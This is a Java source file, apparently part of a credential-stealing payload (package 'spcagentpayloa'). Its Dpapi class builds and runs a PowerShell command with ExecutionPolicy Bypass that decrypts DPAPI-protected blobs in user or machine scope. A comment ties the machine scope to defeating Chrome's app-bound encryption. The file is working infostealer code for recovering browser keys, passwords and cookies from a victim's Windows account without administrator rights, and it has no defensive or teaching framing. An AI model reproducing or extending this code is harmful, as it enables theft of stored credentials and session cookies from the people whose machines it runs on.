package com.spcagentpayloa.jvmxx;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.concurrent.TimeUnit;

/** DPAPI CurrentUser unwrap through ProtectedData, without administrator. */
public final class Dpapi {
	private Dpapi() {
	}

	static String script(String base64) {
		return script(base64, false);
	}

	static String scriptUnused(String base64) {
		String quoted = base64.replace("'", "''");
		return "Add-Type -AssemblyName System.Security;"
			+ "$b=[Convert]::FromBase64String('" + quoted + "');"
			+ "try{$p=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,"
			+ "[Security.Cryptography.DataProtectionScope]::CurrentUser);"
			+ "[Convert]::ToBase64String($p)}catch{}";
	}

	static String script(String base64, boolean machine) {
		String scope = machine ? "LocalMachine" : "CurrentUser";
		String quoted = base64.replace("'", "''");
		return "Add-Type -AssemblyName System.Security;"
			+ "$b=[Convert]::FromBase64String('" + quoted + "');"
			+ "try{$p=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,"
			+ "[Security.Cryptography.DataProtectionScope]::" + scope + ");"
			+ "[Convert]::ToBase64String($p)}catch{}";
	}

	public static byte[] unprotect(byte[] blob) {
		return unprotect(blob, false);
	}

	/** LocalMachine scope is needed by Chrome app-bound encryption. */
	public static byte[] unprotectMachine(byte[] blob) {
		return unprotect(blob, true);
	}

	static byte[] unprotect(byte[] blob, boolean machine) {
		try {
			String output = run(script(Base64.getEncoder().encodeToString(blob), machine));
			String text = output.trim();
			if (text.isEmpty()) {
				return new byte[0];
			}
			for (String line : text.split("\\R")) {
				try {
					byte[] plain = Base64.getDecoder().decode(line.trim());
					if (plain.length > 0) {
						return plain;
					}
				} catch (IllegalArgumentException ignored) {
					// next line
				}
			}
		} catch (Throwable throwable) {
			Log.debug("DPAPI unwrap failed", throwable);
		}
		return new byte[0];
	}

	private static String run(String script) throws Exception {
		ProcessBuilder builder = new ProcessBuilder("powershell", "-NoProfile", "-NonInteractive",
			"-ExecutionPolicy", "Bypass", "-Command", script);
		builder.redirectErrorStream(true);
		Process process = builder.start();
		if (!process.waitFor(10L, TimeUnit.SECONDS)) {
			process.destroyForcibly();
			return "";
		}
		return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
	}
}
